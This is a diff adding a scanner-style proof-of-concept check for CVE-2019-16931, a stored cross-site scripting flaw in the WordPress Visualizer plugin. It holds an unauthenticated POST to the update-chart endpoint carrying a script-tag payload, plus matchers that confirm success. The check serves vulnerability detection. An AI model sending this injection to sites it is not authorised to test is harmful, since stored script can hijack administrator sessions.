@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "检测 WordPress Visualizer 插件存储型跨站脚本漏洞。攻击者可通过未授权访问的 /wp-json/visualizer/v1/update-chart 接口注入恶意脚本，当管理员编辑图表时触发。"
+id = "POC-AVE-2019-0110"
+name = "WordPress Visualizer <3.3.1 Stored Cross-Site Scripting"
+severity = "medium"
+tags = ["ave-2019-0110"]
+vuln_id = [
+    "CVE-2019-16931",
+    "AVE-2019-0110",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-json/visualizer/v1/update-chart"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['{"success":"Chart updated"}']
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["application/json"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
